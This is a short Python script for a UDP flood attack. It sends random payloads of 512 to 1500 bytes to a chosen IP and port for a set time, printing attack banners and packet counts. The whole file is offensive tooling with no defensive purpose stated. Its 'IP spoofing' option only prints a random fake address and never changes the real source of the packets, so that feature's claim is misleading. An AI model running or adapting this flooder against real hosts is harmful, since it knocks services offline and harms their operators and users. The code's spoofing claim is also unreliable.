import socket
import random
import time

def spoof_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def generate_payload(size=1024):
    return random._urandom(size)

def start_udp_flood(ip, port, duration, spoof=False):
    timeout = time.time() + duration
    sent = 0

    print(f"\n[⚡] Attack Started on {ip}:{port} for {duration} seconds.")
    print(f"[🔄] IP Spoofing: {'Enabled' if spoof else 'Disabled'}\n")

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fake_ip = spoof_ip() if spoof else ip
            payload = generate_payload(random.randint(512, 1500))  # random payload size
            sock.sendto(payload, (ip, port))
            sent += 1

            print(f"\r[+] Sent packet #{sent} to {ip}:{port} via {fake_ip}", end="")

        except Exception as e:
            print(f"\n[!] Error: {e}")
            continue

    print(f"\n\n[✅] Attack finished. Total Packets Sent: {sent}")
